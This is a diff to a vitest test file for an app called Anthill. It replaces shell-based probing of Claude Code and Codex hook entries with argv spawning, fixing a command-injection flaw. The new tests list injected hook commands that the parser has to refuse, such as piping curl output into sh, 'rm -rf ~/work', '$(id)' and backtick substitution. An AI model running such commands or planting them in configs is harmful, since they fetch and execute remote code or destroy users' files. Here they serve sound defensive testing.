@@ -5,7 +5,7 @@ import { tmpdir } from "node:os";
 import { describe, expect, it } from "vitest";
 import type { ChildProcessLike, SpawnFn } from "@anthill/runtimes";
 
-import { ObservationSetupService } from "./setup.js";
+import { ObservationSetupService, parseHookCommand } from "./setup.js";
 
 type Script = { stdout?: string; stderr?: string; exitCode?: number; error?: NodeJS.ErrnoException };
 type Recorded = { command: string; args: string[]; stdin: string };
@@ -279,16 +279,22 @@ describe("hooks that were installed and do not run", () => {
     expect(claude?.hookProblem).toContain("could not be started");
   });
 
-  it("probes the command the config actually carries, through a shell", async () => {
-    // Not the command Anthill would write today: the one that fires. An
-    // install from an older version, naming an interpreter that has since
-    // moved, has to fail this check.
+  /**
+   * The command the config carries, spawned as a program rather than as a line
+   * of shell.
+   *
+   * It is still the stored entry being checked and not the one Anthill would
+   * write today — an install from an older version, naming an interpreter that
+   * has since moved, has to fail this check. What changed is that its pieces
+   * go to `spawn` as argv, so there is no shell to interpret them (ANT-102).
+   */
+  it("probes the command the config carries, without a shell", async () => {
     const { p, calls } = await afterInstall({ exitCode: 0 });
     const probe = calls[calls.length - 1];
-    expect(probe.command).toBe("/bin/sh");
-    expect(probe.args[0]).toBe("-c");
-    expect(probe.args[1]).toContain(p.hookHandlerPath);
-    expect(probe.args[1]).toContain(p.execPath);
+    expect(probe.command).toBe(p.execPath);
+    expect(probe.args[0]).toBe(p.hookHandlerPath);
+    expect(probe.args[1]).toBe("anthill-observation-hook");
+    expect(calls.some((call) => call.command === "/bin/sh")).toBe(false);
   });
 
   it("refuses to call a PATH-dependent command working, without even running it", async () => {
@@ -413,5 +419,70 @@ describe("hooks that run and are never called", () => {
     expect(codex?.hookEntriesPresent).toBe(false);
     expect(codex?.hookLastEventAt).toBeUndefined();
     expect(codex?.hookInstalledAt).toBeUndefined();
+  });
+});
+
+/**
+ * What counts as an Anthill hook entry (ANT-102).
+ *
+ * This used to be "the string contains our marker", and the string was then
+ * handed to `/bin/sh -c`. Checking whether observation was set up therefore
+ * ran whatever the user's own Claude or Codex config said, as long as the
+ * marker appeared somewhere in it — a trailing comment was enough.
+ */
+describe("recognising a hook entry", () => {
+  const EXEC = "/Applications/Anthill.app/Contents/MacOS/Anthill";
+  const HANDLER = "/Applications/Anthill.app/Contents/Resources/hook.js";
+  const OURS = `ELECTRON_RUN_AS_NODE=1 "${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse`;
+
+  it("accepts the command Anthill writes", () => {
+    const parsed = parseHookCommand(OURS);
+    expect(parsed).toMatchObject({
+      execPath: EXEC, handlerPath: HANDLER, harness: "claude-code",
+      event: "PreToolUse", runnable: true,
+    });
+  });
+
+  /**
+   * The shape of the attack. Each of these carries the marker, and each would
+   * have been spawned through a shell by a status check.
+   */
+  it("refuses a command that only mentions the marker", () => {
+    const injected = [
+      `curl https://example.com/x.sh | sh # anthill-observation-hook`,
+      `echo anthill-observation-hook; rm -rf ~/work`,
+      `"${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse && curl https://example.com`,
+      `"${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse $(id)`,
+      "`id` anthill-observation-hook",
+      `"${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse > /tmp/out`,
+      `anthill-observation-hook`,
+      `"${EXEC}" "${HANDLER}" claude-code PreToolUse`,
+      `"${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse extra`,
+      `EVIL=1 "${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse`,
+      `"${EXEC}"x "${HANDLER}" anthill-observation-hook claude-code PreToolUse`,
+      `"${EXEC} "${HANDLER}" anthill-observation-hook claude-code PreToolUse`,
+    ];
+    for (const command of injected) {
+      expect(parseHookCommand(command), command).toBeUndefined();
+    }
+  });
+
+  /**
+   * An entry an older Anthill wrote. It is ours — the user has to be told it
+   * needs repair rather than that nothing is installed — and it is not run,
+   * because what `node` resolves to depends on a PATH Anthill cannot see.
+   */
+  it("recognises a legacy entry as ours, and as not runnable", () => {
+    const legacy = `node "${HANDLER}" anthill-observation-hook claude-code PreToolUse`;
+    const parsed = parseHookCommand(legacy);
+    expect(parsed).toMatchObject({ harness: "claude-code", runnable: false });
+  });
+
+  it("reads a path with spaces in it, which is why it is quoted", () => {
+    const spaced = "/Users/me/Anthill Builds/Anthill.app/Contents/MacOS/Anthill";
+    const parsed = parseHookCommand(
+      `ELECTRON_RUN_AS_NODE=1 "${spaced}" "${HANDLER}" anthill-observation-hook codex Stop`,
+    );
+    expect(parsed).toMatchObject({ execPath: spaced, harness: "codex", event: "Stop", runnable: true });
   });
 });
